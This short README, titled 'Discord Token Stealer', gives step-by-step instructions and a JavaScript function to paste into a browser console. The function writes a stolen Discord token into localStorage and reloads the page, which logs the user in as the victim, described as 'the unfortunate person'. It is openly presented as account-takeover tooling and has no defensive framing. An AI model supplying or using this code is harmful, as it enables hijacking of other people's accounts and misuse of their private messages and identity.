# Discord Token Stealer
## How to log-in a token:
If you don't know already, here's how you can log in Discord via token (browser only):
1. Press F12 or open Developer tools and go to console.
2. Copy paste this javascript function to the console (yeah, copypaste the entire thing).
```js
function login(token) 
{ 
    setInterval(() => 
    { 
        document.body.appendChild(document.createElement `iframe`)
        .contentWindow.localStorage.token = `"${token}"` 
    }
    , 50); 

    setTimeout(() => { location.reload(); }, 1000); 
}
```
3. Now on the same console, do ```login("[TOKEN HERE]")```, wait until the window refreshes or refresh it yourself.

Ta-da, you're now logged in as the unfortunate person.